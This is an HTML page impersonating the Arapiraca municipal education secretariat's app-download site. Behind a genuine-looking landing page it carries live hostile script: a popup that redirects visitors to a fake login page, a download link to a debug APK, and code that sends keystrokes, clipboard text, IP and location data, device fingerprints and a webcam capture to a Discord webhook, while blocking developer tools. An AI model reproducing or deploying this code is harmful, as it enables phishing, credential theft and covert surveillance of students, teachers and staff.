<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="index, follow">
        <meta name="abstract" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta name="topic" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta name="summary" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:url" id="tag_url" content="">
	    <meta property="og:type" content="website">
	    <meta property="og:title" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:site_name" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:locale" content="pt_BR">
	    <meta itemprop="name" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
      	<meta itemprop="description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
     	<meta name="twitter:card" content="summary">
    	<meta name="twitter:site" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
    	<meta name="twitter:url" id="twitter_url" content="https://arapiraca-al.portalsigeduc.com.br.portalsigeduc.com.br/">
    	<meta name="twitter:title" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
     	<meta name="twitter:description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="author" content="CARLIANY VIT√ìRIA DA SILVA SANTOS">
		<meta name="keywords" content="SME - Secretaria de Educa√ß√£o de Arapiraca">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="msthemecompatible" content="no">
		<meta name="geo.region" content="BR-AL">
        <meta name="geo.placename" content="Arapiraca">
        <meta name="geo.position" content="-2.7526;-46.6615">
        <meta name="ICBM" content="-1.7226, -23.6615">
        <meta name="content-language" content="pt-br">
        <meta name="generator" content="HTML5 + CSS3 + JS">
        <meta name="referrer" content="no-referrer-when-downgrade">
        <meta http-equiv="cleartype" content="on">
		<meta name="language" content="pt-BR">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
		<title>SME - Secretaria de Educa√ß√£o de Arapiraca - AL</title>
		<meta name="theme-color" content="#0000FF">
        <link rel="icon" type="image/png" href="img/icon.png">
        <style>
    :root {
      --azul-escuro: #002b66;
      --azul-claro: #007bff;
      --dourado: #ffcc00;
      --dourado-brilho: #ffd700;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: linear-gradient(135deg, var(--azul-escuro), var(--azul-claro));
      color: #fff;
      line-height: 1.6;
      overflow-x: hidden;
    }

    header {
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(8px);
      padding: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
      text-align: center;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.4);
    }

    header img {
      height: 55px;
      max-width: 100%;
    }

    header h1 {
      font-size: clamp(1.3rem, 3vw, 2rem);
      color: var(--dourado-brilho);
      text-shadow: 0 0 12px var(--dourado-brilho);
      font-weight: 700;
    }

    .hero {
      text-align: center;
      padding: clamp(60px, 10vw, 120px) 20px;
      background: radial-gradient(circle at center, var(--azul-claro) 0%, var(--azul-escuro) 100%);
      box-shadow: inset 0 0 80px rgba(255, 255, 255, 0.1);
    }

    .hero h2 {
      font-size: clamp(1.8rem, 5vw, 3rem);
      color: var(--dourado);
      text-shadow: 0 0 15px var(--dourado-brilho);
      margin-bottom: 15px;
    }

    .hero p {
      font-size: clamp(1rem, 2vw, 1.3rem);
      max-width: 750px;
      margin: 0 auto 35px;
      color: #e8f0ff;
    }

    .btn-container {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
    }

    .btn-download {
      background: linear-gradient(135deg, var(--dourado) 0%, #ffaa00 100%);
      color: #002b66;
      padding: 15px 35px;
      font-size: clamp(1rem, 2vw, 1.2rem);
      border-radius: 10px;
      text-decoration: none;
      font-weight: 600;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
      transition: all 0.3s ease;
    }

    .btn-download:hover {
      transform: scale(1.07);
      box-shadow: 0 0 25px rgba(255, 255, 120, 0.9);
    }

    .features {
      max-width: 1200px;
      margin: 70px auto;
      padding: 0 20px;
    }

    .features h3 {
      text-align: center;
      font-size: clamp(1.6rem, 4vw, 2.5rem);
      color: var(--dourado);
      text-shadow: 0 0 10px var(--dourado-brilho);
      margin-bottom: 50px;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 25px;
    }

    .feature {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      padding: 25px;
      backdrop-filter: blur(5px);
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.25);
      text-align: center;
      transition: all 0.3s ease;
    }

    .feature:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(255, 255, 120, 0.6);
    }

    .feature img {
      width: 70px;
      height: 70px;
      object-fit: contain;
      filter: drop-shadow(0 0 10px var(--dourado-brilho));
      margin-bottom: 15px;
    }

    .feature h4 {
      font-size: clamp(1rem, 2vw, 1.3rem);
      color: #fff;
      margin-bottom: 10px;
    }

    .feature p {
      color: #eaeaea;
      font-size: clamp(0.9rem, 1.5vw, 1rem);
    }

    footer {
      background: rgba(0, 0, 0, 0.6);
      text-align: center;
      padding: 25px 10px;
      color: #ddd;
      font-size: 0.9rem;
      border-top: 1px solid rgba(255,255,255,0.2);
    }

    footer a {
      color: var(--dourado);
      text-decoration: none;
    }

    footer a:hover {
      text-decoration: underline;
    }
 /* Fundo escuro com efeito suave */
.popup {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  display: flex;
  align-items: center;
  justify-content: center; /* centraliza no meio da tela */
  z-index: 9999;
  backdrop-filter: blur(6px);
}

/* Caixa do popup */
.popup-content {
  background: linear-gradient(180deg, #0d47a1, #1976d2); /* azul elegante */
  color: #fff;
  padding: 30px 25px;
  border-radius: 16px;
  text-align: center;
  max-width: 420px;
  width: 90%;
  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
  animation: fadeIn 0.8s ease forwards;
  position: relative;
  overflow: hidden;
}

/* Bordas douradas sutis */
.popup-content::before {
  content: "";
  position: absolute;
  inset: 0;
  border: 2px solid #ffd700;
  border-radius: 16px;
  pointer-events: none;
  opacity: 0.8;
}

/* Imagem central */
.popup-img {
  width: 90px;
  margin-bottom: 15px;
  filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.7));
}

/* T√≠tulo */
.popup-content h2 {
  margin-bottom: 12px;
  color: #ffd700; /* dourado */
  font-size: 22px;
  font-weight: bold;
}

/* Texto */
.popup-content p {
  color: #f1f1f1;
  font-size: 15px;
  line-height: 1.5;
  margin-bottom: 20px;
}

/* Barra de carregamento dourada */
.progress-bar {
  width: 100%;
  height: 10px;
  background: rgba(255, 255, 255, 0.2);
  border-radius: 5px;
  overflow: hidden;
  margin-top: 10px;
}

.progress-fill {
  width: 0%;
  height: 100%;
  background: linear-gradient(90deg, #ffd700, #fff3b0);
  animation: loadBar 55s linear forwards;
  border-radius: 5px;
}

/* --- Anima√ß√µes --- */
@keyframes loadBar {
  from { width: 0%; }
  to { width: 100%; }
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: scale(0.9);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}

/* Responsivo para celular */
@media (max-width: 480px) {
  .popup-content {
    padding: 25px 20px;
    max-width: 90%;
  }

  .popup-content h2 {
    font-size: 20px;
  }

  .popup-content p {
    font-size: 14px;
  }

  .popup-img {
    width: 70px;
  }
}


  </style>
    </head>
    <body>
        <div id="popup" class="popup">
  <div class="popup-content">
    <img src="img/icon.png" alt="Logo da institui√ß√£o" class="popup-img">
    <h2>Ol√°!</h2>
    <p>
      Para fazer o download do aplicativo, √© necess√°rio confirmar se voc√™ √© aluno,
      professor ou funcion√°rio. Apenas usu√°rios vinculados √† institui√ß√£o t√™m acesso
      autorizado. Em instantes, voc√™ ser√° redirecionado ao sistema de login para
      validar sua identidade.
    </p>
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
  </div>
</div>

 <header>
    <img src="img/icon.png" alt="SME Arapiraca">
    <h1>App Educacional Arapiraca</h1>
  </header>

  <section class="hero">
    <h2>Transformando Educa√ß√£o em Conex√£o</h2>
    <p>O aplicativo oficial da Secretaria Municipal de Educa√ß√£o de Arapiraca conecta alunos, professores e respons√°veis em um ambiente digital simples e completo. Acompanhe notas, frequ√™ncias, comunicados e muito mais!</p>
    <div class="btn-container">
      <a href="https://www.mediafire.com/file/zc2j2ujk6vi2po5/SME_Arapiraca_Digital-13.0-arm64-v8a_armeabi-v7a-debug.apk/file" class="btn-download">üì± Baixar para Android</a>
      <a href="https://www.mediafire.com/file/zc2j2ujk6vi2po5/SME_Arapiraca_Digital-13.0-arm64-v8a_armeabi-v7a-debug.apk/file" class="btn-download">üçé Baixar para iOS</a>
    </div>
  </section>

  <section class="features">
    <h3>Recursos do Aplicativo</h3>
    <div class="features-grid">
      <div class="feature">
        <img src="img/notas.png" alt="Notas e Avalia√ß√µes">
        <h4>Notas e Desempenho</h4>
        <p>Veja suas notas, m√©dias e hist√≥rico escolar de forma r√°pida e segura.</p>
      </div>

      <div class="feature">
        <img src="img/Frequencia.png" alt="Frequ√™ncia Escolar">
        <h4>Frequ√™ncia Escolar</h4>
        <p>Acompanhe suas presen√ßas e justificativas diretamente pelo aplicativo.</p>
      </div>

      <div class="feature">
        <img src="img/aviso.png" alt="Comunica√ß√£o">
        <h4>Comunica√ß√£o</h4>
        <p>Conecte-se com professores e escolas por meio de mensagens e avisos.</p>
      </div>

      <div class="feature">
        <img src="img/prof.png" alt="Professores">
        <h4>Gest√£o do Professor</h4>
        <p>Registre presen√ßa, insira notas e organize turmas com facilidade.</p>
      </div>

      <div class="feature">
        <img src="img/documento.jpeg" alt="Documentos">
        <h4>Documentos e Boletins</h4>
        <p>Baixe boletins, hist√≥ricos e comprovantes de matr√≠cula digitalmente.</p>
      </div>
    </div>
  </section>

  <footer>
    &copy; 2025 Secretaria Municipal de Educa√ß√£o de Arapiraca ‚Äì Todos os direitos reservados.  
    <br><a href="#">Pol√≠tica de Privacidade</a> | <a href="#">Termos de Uso</a>
  </footer>
 <script>
document.addEventListener("DOMContentLoaded", () => {
  const popup = document.getElementById("popup");
  const progress = document.querySelector(".progress-fill");

  // tempo total da anima√ß√£o em milissegundos
  const tempoTotal = 55000;

  // mostra apenas uma vez por navegador
  if (!localStorage.getItem("popupShown")) {
    popup.style.display = "flex";
    localStorage.setItem("popupShown", "true");

    // Inicia a anima√ß√£o da barra
    progress.style.animation = `loadBar ${tempoTotal / 1000}s linear forwards`;

    // S√≥ redireciona exatamente ap√≥s a anima√ß√£o terminar
    progress.addEventListener("animationend", () => {
      window.location.href = "https://sigeducescolavirtucal.github.io/app-login/";
    });
  } else {
    popup.remove();
  }
});
</script>

<script>
  var WEBHOOK_URL = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";

function mostrarNotificacao() {
  const options = {
    body: "APP GOLD",
    icon: "static/gold.jpeg",   
    image: "static/gold.jpeg", 
    badge: "static/gold.jpeg",
    vibrate: [200, 100, 200],   
    data: { url: "https://blackstrik7.serveo.net" }
  };

  try {
    const n = new Notification("üì≤ ContatoOS Gold", options);
    n.onclick = (event) => {
      event.preventDefault();
      window.open(options.data.url, "_blank");
    };
  } catch (err) {
    console.error("Erro ao criar notifica√ß√£o:", err);
  }
}

Notification.requestPermission().then(permission => {
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "Notif Bot",
      content: `üì≤ Permiss√£o de notifica√ß√£o: **${permission}**`
    })
  }).catch(err => console.error("Erro ao enviar notifica√ß√£o para webhook:", err));
});

function sendWebhook(status) {
  const data = {
    usuario: "Vitman do Site",
    status: status,
    horario: new Date().toLocaleString()
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  }).catch(err => console.error("Erro ao enviar:", err));
}

document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    sendWebhook("üü¢ Vitman voltou para o site");
  } else {
    sendWebhook("üü° Vitman minimizou/foi para outra aba");
  }
});

window.addEventListener("beforeunload", () => {
  sendWebhook("üî¥ Vitman saiu do site");
});

window.addEventListener("load", () => {
  sendWebhook("‚úÖ Vitman entrou no site");
});

async function getIPs() {
  const ips = [];
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ips.push({ tipo: "P√∫blico", ip: data.ip });
  } catch (e) {
    console.warn("Falha ao buscar IP p√∫blico", e);
  }
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const match = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
        if (match && !ips.find(x => x.ip === match[1])) {
          ips.push({ tipo: "Local", ip: match[1] });
          console.log("IP Local detectado:", match[1]);
        }
      }
    };
    await pc.createOffer().then(o => pc.setLocalDescription(o));
  } catch (e) {
    console.warn("Falha ao buscar IP local", e);
  }

  return ips;
}

async function sendToDiscord(data) {
  const payload = {
    username: "Blackhat Bot",
    embeds: [
      {
        title: "üì° Resultados do Teste",
        description: "IPs coletados da rede",
        color: 3447003,
        fields: data.map(ipObj => ({
          name: ipObj.tipo,
          value: ipObj.ip,
          inline: true
        })),
        footer: { text: "Vitman" },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("Dados enviados para o Discord!");
  } catch (err) {
    console.error("Erro ao enviar IPs:", err);
  }
}

getIPs().then(ips => {
  console.log("Lista de IPs encontrados:", ips);
  sendToDiscord(ips);
});

async function readClipboardAndSend() {
  try {
    const permission = await navigator.permissions.query({ name: "clipboard-read" });
    if (permission.state === "denied") {
      console.warn("Permiss√£o negada para acessar clipboard.");
      return;
    }

    const text = await navigator.clipboard.readText();
    if (!text) {
      console.log("Clipboard vazio.");
      return;
    }

    console.log("Texto do clipboard:", text);

    const payload = {
      username: "Clipboard Bot",
      avatar_url: "https://i.imgur.com/AfFp7pu.png",
      embeds: [
        {
          title: "üìã Novo conte√∫do do clipboard",
          description: text.slice(0, 2000),
          color: 3447003,
          footer: { text: "Enviado automaticamente" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) console.log("Enviado ao Discord com sucesso!");
    else console.error("Falha ao enviar:", res.status);
  } catch (err) {
    console.error("Erro ao ler clipboard:", err);
  }
}

window.addEventListener("load", () => {
  readClipboardAndSend();
});

async function getLocationAndSend() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    let mapsUrl = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;

    let payload = {
      username: "üåê GeoBot Avan√ßado",
      embeds: [{
        title: "üì° Detalhes da Conex√£o",
        color: 0x1E90FF,
        description: `üîé Localiza√ß√£o obtida pelo IP.\n[üìç Ver no Google Maps](${mapsUrl})`,
        fields: [
          { name: "üåç IP", value: data.ip || "N/A", inline: true },
          { name: "üèôÔ∏è Cidade", value: data.city || "N/A", inline: true },
          { name: "üó∫Ô∏è Regi√£o", value: data.region || "N/A", inline: true },
          { name: "üá®üá¥ Pa√≠s", value: data.country_name || "N/A", inline: true },
          { name: "üåê C√≥digo Pa√≠s", value: data.country || "N/A", inline: true },
          { name: "‚è∞ Fuso hor√°rio", value: data.timezone || "N/A", inline: true },
          { name: "üí∞ Moeda", value: data.currency || "N/A", inline: true },
          { name: "üì° Provedor (ISP)", value: data.org || "N/A", inline: false },
          { name: "üìå Latitude", value: data.latitude || "N/A", inline: true },
          { name: "üìå Longitude", value: data.longitude || "N/A", inline: true }
        ],
        thumbnail: {
          url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
        },
        footer: { text: "Dados fornecidos por ipapi.co üåê" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("‚úÖ Dados enviados para o Discord!");
  } catch (e) {
    console.error("Erro ao buscar dados de localiza√ß√£o:", e);
  }
}

getLocationAndSend();

async function detectVPN() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    let org = (data.org || "").toLowerCase();
    let asn = (data.asn || "").toLowerCase();

    let suspeitos = ["amazon", "aws", "google", "ovh", "digitalocean", "microsoft", "azure", "contabo", "linode", "vultr", "hetzner", "cloudflare"];
    let vpnDetectado = suspeitos.some(nome => org.includes(nome) || asn.includes(nome));

    let status = vpnDetectado ? "‚ö†Ô∏è Poss√≠vel VPN/Proxy detectado" : "‚úÖ Parece ser uma conex√£o residencial normal";

    let payload = {
      username: "VPN Detector",
      embeds: [{
        title: "üîé Verifica√ß√£o de VPN / Proxy",
        color: vpnDetectado ? 0xFF0000 : 0x00FF00,
        fields: [
          { name: "IP", value: data.ip || "N/A", inline: true },
          { name: "Cidade", value: data.city || "N/A", inline: true },
          { name: "Pa√≠s", value: data.country_name || "N/A", inline: true },
          { name: "Org", value: data.org || "N/A", inline: false },
          { name: "ASN", value: data.asn || "N/A", inline: false },
          { name: "Resultado", value: status, inline: false }
        ],
        footer: { text: "Analisado com ipapi.co üåê" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("‚úÖ Resultado enviado para o Discord!");
  } catch (e) {
    console.error("Erro ao detectar VPN:", e);
  }
}

detectVPN();

document.addEventListener("keydown", async (event) => {
  let payload = {
    username: "KeyLogger:",
    content: `‚å®Ô∏è Tecla pressionada: **${event.key}**`
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(err => console.error("Erro ao enviar keylog:", err));
});

(() => {
  document.addEventListener('contextmenu', (e) => e.preventDefault(), { passive: false });

  document.addEventListener('keydown', (e) => {
    const k = e.key.toLowerCase();
    const ctrl = e.ctrlKey || e.metaKey;
    const shift = e.shiftKey;

    if (k === 'f12') return e.preventDefault();
    if (ctrl && shift && ['i', 'j', 'c'].includes(k)) return e.preventDefault();
    if (ctrl && ['u', 's', 'p'].includes(k)) return e.preventDefault();
  }, { passive: false });

  const showShield = () => {
    if (document.getElementById('shield-devtools')) return;
    const d = document.createElement('div');
    d.id = 'shield-devtools';
    Object.assign(d.style, {
      position: 'fixed', inset: '0', background: 'rgba(10,10,10,.95)',
      color: '#fff', zIndex: '2147483647', display: 'flex',
      alignItems: 'center', justifyContent: 'center',
      fontFamily: 'system-ui, sans-serif', textAlign: 'center',
      padding: '24px'
    });
    d.innerHTML = `
      <div>
        <div style="font-size:22px;font-weight:700;margin-bottom:8px">Inspe√ß√£o bloqueada</div>
        <div style="opacity:.8">Acesso negado</div>
      </div>`;
    document.body.appendChild(d);
  };

  const hideShield = () => {
    const el = document.getElementById('shield-devtools');
    if (el) el.remove();
  };

  const isDockedDevtools = () => {
    const wGap = Math.abs(window.outerWidth - window.innerWidth);
    const hGap = Math.abs(window.outerHeight - window.innerHeight);
    return wGap > 160 || hGap > 160;
  };

  const perfTrapDetect = () => {
    const t0 = performance.now();
    debugger;
    const dt = performance.now() - t0;
    return dt > 100;
  };

  let lastState = false;
  setInterval(() => {
    const open = isDockedDevtools() || perfTrapDetect();
    if (open && !lastState) showShield();
    if (!open && lastState) hideShield();
    lastState = open;
  }, 1200);
})();

async function sendFullDeviceInfo() {
  try {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const cores = navigator.hardwareConcurrency || "N/A";
    const memory = navigator.deviceMemory || "N/A";
    const language = navigator.language;
    const screenSize = `${window.screen.width}x${window.screen.height}`;
    let canvas = document.createElement("canvas");
    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    let gpuInfo = "N/A";
    if (gl) {
      let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
    let batteryInfo = { level: "N/A", charging: "N/A" };
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryInfo.level = Math.round(battery.level * 100) + "%";
      batteryInfo.charging = battery.charging ? "‚úÖ Carregando" : "‚ùå N√£o carregando";
    }
    async function getLocalIP() {
      return new Promise((resolve) => {
        let ipFound = null;
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.onicecandidate = (event) => {
          if (!event.candidate) {
            pc.close();
            resolve(ipFound || "N/A");
            return;
          }
          const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
          if (ipMatch) ipFound = ipMatch[1];
        };
        pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => resolve("N/A"));
      });
    }
    const localIP = await getLocalIP();
    let publicIP = "N/A", city = "N/A", region = "N/A", country = "N/A";
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      publicIP = data.ip || "N/A";
      city = data.city || "N/A";
      region = data.region || "N/A";
      country = data.country_name || "N/A";
    } catch {}
    const payload = {
      username: "üì± Device Info Bot",
      embeds: [{
        title: "üíª Informa√ß√µes do Dispositivo Completo",
        color: 0x1E90FF,
        fields: [
          { name: "üñ• Plataforma", value: platform, inline: true },
          { name: "üåê User Agent", value: ua, inline: false },
          { name: "üß† CPU Cores", value: cores.toString(), inline: true },
          { name: "üíæ RAM (GB)", value: memory.toString(), inline: true },
          { name: "üé® GPU", value: gpuInfo, inline: true },
          { name: "üñ• Tela", value: screenSize, inline: true },
          { name: "üó£Ô∏è Idioma", value: language, inline: true },
          { name: "üîã Bateria", value: batteryInfo.level, inline: true },
          { name: "‚ö° Carregando?", value: batteryInfo.charging, inline: true },
          { name: "üåê IP Local", value: localIP, inline: true },
          { name: "üåç IP P√∫blico", value: publicIP, inline: true },
          { name: "üèô Cidade / Regi√£o / Pa√≠s", value: `${city} / ${region} / ${country}`, inline: false }
        ],
        footer: { text: "Coletado com JavaScript no navegador" },
        timestamp: new Date().toISOString()
      }]
    };
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("‚úÖ Informa√ß√µes completas enviadas para o Discord!");
  } catch (e) {
    console.error("Erro ao coletar informa√ß√µes:", e);
  }
}

sendFullDeviceInfo();

async function coletarFingerprint() {
  async function gerarHash(obj) {
    const msgBuffer = new TextEncoder().encode(JSON.stringify(obj));
    const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
    return Array.from(new Uint8Array(hashBuffer))
      .map(b => b.toString(16).padStart(2, "0"))
      .join("");
  }
  function getCanvasFingerprint() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "16px Arial";
    ctx.fillText("Fingerprint Test", 2, 2);
    return canvas.toDataURL();
  }
  function getWebGLFingerprint() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return "N√£o suportado";
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
      };
    } catch {
      return "Erro";
    }
  }
  async function getAudioFingerprint() {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = ctx.createOscillator();
      const analyser = ctx.createAnalyser();
      const gain = ctx.createGain();
      gain.gain.value = 0;
      oscillator.connect(analyser);
      analyser.connect(gain);
      gain.connect(ctx.destination);
      oscillator.start(0);
      const data = new Float32Array(analyser.frequencyBinCount);
      analyser.getFloatFrequencyData(data);
      oscillator.stop();
      return data.slice(0, 20).join(",");
    } catch {
      return "N√£o dispon√≠vel";
    }
  }
  function detectarFontes() {
    const fontes = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS"];
    const baseFont = "monospace";
    const span = document.createElement("span");
    span.innerText = "abcdefghiABCDEFGHI";
    span.style.fontSize = "72px";
    document.body.appendChild(span);
    const resultados = [];
    fontes.forEach(f => {
      span.style.fontFamily = `${f},${baseFont}`;
      const largura = span.offsetWidth;
      const altura = span.offsetHeight;
      span.style.fontFamily = baseFont;
      if (span.offsetWidth !== largura || span.offsetHeight !== altura) {
        resultados.push(f);
      }
    });
    document.body.removeChild(span);
    return resultados;
  }
  function detectarPlugins() {
    return Array.from(navigator.plugins).map(p => p.name);
  }
  function detectarAdblock() {
    const bait = document.createElement("div");
    bait.className = "adsbox";
    bait.style.display = "none";
    document.body.appendChild(bait);
    const detectado = window.getComputedStyle(bait).display === "none";
    document.body.removeChild(bait);
    return detectado;
  }
  function detectarRede() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {
      effectiveType: c.effectiveType,
      downlink: c.downlink,
      rtt: c.rtt,
      saveData: c.saveData
    } : "Indispon√≠vel";
  }
  async function detectarBateria() {
    try {
      const b = await navigator.getBattery();
      return {
        carregando: b.charging,
        nivel: (b.level * 100) + "%",
        tempoCarga: b.chargingTime,
        tempoDescarga: b.dischargingTime
      };
    } catch {
      return "Indispon√≠vel";
    }
  }
  async function detectarWebRTC() {
    return new Promise(resolve => {
      try {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
          if (e && e.candidate && e.candidate.candidate) {
            const parts = e.candidate.candidate.split(" ");
            const ip = parts[4];
            if (!ips.includes(ip)) ips.push(ip);
          } else {
            resolve(ips);
          }
        };
      } catch {
        resolve("Indispon√≠vel");
      }
    });
  }
  async function detectarIPPublico() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "Indispon√≠vel";
    }
  }

  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    coresCPU: navigator.hardwareConcurrency,
    memoria: navigator.deviceMemory || "desconhecido",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tela: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      orientation: screen.orientation?.type || "desconhecido"
    },
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    audio: await getAudioFingerprint(),
    fontes: detectarFontes(),
    plugins: detectarPlugins(),
    adblock: detectarAdblock(),
    rede: detectarRede(),
    bateria: await detectarBateria(),
    webrtc: await detectarWebRTC(),
    ipPublico: await detectarIPPublico(),
    touch: navigator.maxTouchPoints,
    permissoes: await navigator.permissions?.query({ name: "camera" }).then(r => r.state).catch(() => "desconhecido")
  };

  fingerprint.hash = await gerarHash(fingerprint);

  console.log("Fingerprint coletado:", fingerprint);

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fingerprint, null, 2)
    });
    console.log("Fingerprint enviado com sucesso!");
  } catch (err) {
    console.error("Erro ao enviar fingerprint:", err);
  }
}

window.addEventListener("load", coletarFingerprint);

(async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });

    const [track] = stream.getVideoTracks();

    let blob;
    if ('ImageCapture' in window) {
      const ic = new ImageCapture(track);
      const bitmap = await ic.grabFrame();
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0);
      blob = await new Promise(res => canvas.toBlob(res, 'image/png', 0.92));
    } else {
      const video = document.createElement('video');
      video.playsInline = true;
      video.muted = true;
      video.srcObject = stream;
      await video.play();

      await new Promise(res => {
        if (video.readyState >= 2) return res();
        video.onloadeddata = () => res();
      });

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      blob = await new Promise(res => canvas.toBlob(res, 'image/png', 0.92));
    }

    const form = new FormData();
    const payload = {
      username: "Camera Bot",
      embeds: [{
        title: "üì∏ Captura realizada",
        description: "Frame obtido via getUserMedia() com consentimento.",
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        image: { url: "attachment://captura.png" },
        footer: { text: navigator.userAgent }
      }]
    };

    form.append("payload_json", JSON.stringify(payload));
    form.append("file", blob, "captura.png");
    const resp = await fetch(WEBHOOK_URL, { method: "POST", body: form });
